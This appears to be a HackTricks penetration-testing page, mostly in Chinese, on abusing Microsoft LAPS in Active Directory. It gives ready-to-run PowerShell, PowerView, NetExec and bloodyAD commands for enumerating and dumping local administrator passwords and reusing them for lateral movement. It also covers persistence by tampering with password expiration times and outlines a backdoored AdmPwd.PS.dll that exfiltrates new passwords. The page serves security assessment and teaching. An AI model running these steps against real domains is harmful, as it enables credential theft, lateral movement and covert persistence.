# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

目前在一次 assessment 中，你可能会遇到 **2 种 LAPS 版本**：

- **Legacy Microsoft LAPS**: 将本地 administrator password 存储在 **`ms-Mcs-AdmPwd`** 中，并将 expiration time 存储在 **`ms-Mcs-AdmPwdExpirationTime`** 中。
- **Windows LAPS**（自 2023 年 4 月更新起内置于 Windows）：仍然可以模拟 legacy mode，但在 native mode 下它使用 **`msLAPS-*`** 属性，支持 **password encryption**、**password history** 和面向 domain controllers 的 **DSRM password backup**。

LAPS 的设计目的是管理 **local administrator passwords**，使它们在加入 domain 的 computers 上保持 **unique、randomized，并且频繁更改**。如果你能够读取这些属性，通常就可以 **pivot as the local admin** 到受影响的 host。在许多环境中，真正有价值的不只是读取 password 本身，还包括找到**被委派了访问权限**去读取这些 password 属性的人。

### Legacy Microsoft LAPS attributes

在 domain 的 computer objects 中，legacy Microsoft LAPS 的实现会新增两个属性：

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Native Windows LAPS 会向 computer objects 添加几个新属性：

- **`msLAPS-Password`**: 当未启用 encryption 时，以 JSON 形式存储的 clear-text password blob
- **`msLAPS-PasswordExpirationTime`**: 计划的 expiration time
- **`msLAPS-EncryptedPassword`**: encrypted current password
- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: 用于 domain controllers 的 encrypted DSRM password data
- **`msLAPS-CurrentPasswordVersion`**: 基于 GUID 的 version tracking，用于更新的 rollback-detection logic（Windows Server 2025 forest schema）

当 **`msLAPS-Password`** 可读时，其值是一个 JSON object，包含 account name、update time 和 clear-text password，例如：
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### 检查是否已激活
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

你可以从 `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` **download the raw LAPS policy**，然后使用 [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) 包中的 **`Parse-PolFile`** 将此文件转换为人类可读格式。

### Legacy Microsoft LAPS PowerShell cmdlets

如果安装了 legacy LAPS module，通常可以使用以下 cmdlets：
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

原生 Windows LAPS 附带一个新的 PowerShell module 和新的 cmdlets：
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText
```
这里有几个操作细节很重要：

- **`Get-LapsADPassword`** 会自动处理 **legacy LAPS**、**clear-text Windows LAPS** 和 **encrypted Windows LAPS**。
- 如果密码是 encrypted 的，而你可以 **read** 但不能 **decrypt** 它，那么 cmdlet 会返回 metadata，但不会返回 clear-text password。
- **Password history** 只有在启用 **Windows LAPS encryption** 时才可用。
- 在 domain controllers 上，返回的 source 可能是 **`EncryptedDSRMPassword`**。

### PowerView / LDAP

**PowerView** 也可以用来找出 **who can read the password and read it**：
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
如果 **`msLAPS-Password`** 可读，解析返回的 JSON，并提取 **`p`** 作为密码，提取 **`n`** 作为受管本地管理员账户名。

### Linux / remote tooling

现代工具支持 legacy Microsoft LAPS 和 Windows LAPS。
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
备注：

- 最新的 **NetExec** 构建支持 **`ms-Mcs-AdmPwd`**、**`msLAPS-Password`** 和 **`msLAPS-EncryptedPassword`**。
- **`pyLAPS`** 仍然适用于从 Linux 获取 **legacy Microsoft LAPS**，但它只针对 **`ms-Mcs-AdmPwd`**。
- 如果环境使用的是 **encrypted Windows LAPS**，简单的 LDAP 读取还不够；你还需要是一个**authorized decryptor**，或者滥用受支持的解密路径。

### Directory synchronization abuse

如果你拥有域级别的 **directory synchronization** 权限，而不是对每个计算机对象的直接读取权限，LAPS 仍然可能很有价值。

**`DS-Replication-Get-Changes`** 与 **`DS-Replication-Get-Changes-In-Filtered-Set`** 或 **`DS-Replication-Get-Changes-All`** 的组合可用于同步 **confidential / RODC-filtered** 属性，例如 legacy **`ms-Mcs-AdmPwd`**。BloodHound 将其建模为 **`SyncLAPSPassword`**。有关复制权限的背景，请查看 [DCSync](dcsync.md)。

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) 提供了多个函数，便于枚举 LAPS。\
其中一个功能是为**所有启用了 LAPS 的计算机**解析 **`ExtendedRights`**。这会显示被**明确委派为读取 LAPS 密码**的**groups**，这些对象通常是受保护组中的用户。\
一个**account**如果曾将某台 computer **加入**域，就会获得该主机上的 `All Extended Rights`，而该权限赋予该**account**读取**密码**的能力。枚举可能会显示某个可在主机上读取 LAPS 密码的用户账户。这有助于我们**定位能够读取 LAPS 密码的特定 AD 用户**。
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## 使用 NetExec / CrackMapExec 转储 LAPS 密码

如果你没有交互式 PowerShell，你可以通过 LDAP 远程滥用这个权限：
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
这会转储该用户能够读取的所有 LAPS secrets，从而让你可以使用不同的本地管理员密码进行横向移动。

## 使用 LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS 持久化

### Expiration Date

一旦拿到 admin，就可以 **获取密码**，并通过 **将 expiration date 设到未来** 来 **阻止** 机器 **更新** 其 **password**。

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
原生 Windows LAPS 则使用 **`msLAPS-PasswordExpirationTime`**：
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> 如果 **admin** 使用 **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**，或者启用了 **Do not allow password expiration time longer than required by policy**，密码仍然会轮换。

### 从 AD 备份中恢复历史密码

当启用 **Windows LAPS encryption + password history** 时，已挂载的 AD 备份可能成为额外的 secrets 来源。如果你可以访问已挂载的 AD 快照并使用 **recovery mode**，你就可以在不与实时 DC 通信的情况下查询更早存储的密码。
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
这在 **AD backup theft**、**offline forensics abuse** 或 **disaster-recovery media access** 期间最相关。

### Backdoor

旧版 Microsoft LAPS 的原始源代码可以在 [here](https://github.com/GreyCorbel/admpwd) 找到，因此可以在代码中植入 backdoor（例如在 `Main/AdmPwd.PS/Main.cs` 中的 `Get-AdmPwdPassword` 方法里），以某种方式 **exfiltrate new passwords or store them somewhere**。

然后，编译新的 `AdmPwd.PS.dll` 并将其上传到机器上的 `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll`（并修改修改时间）。

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
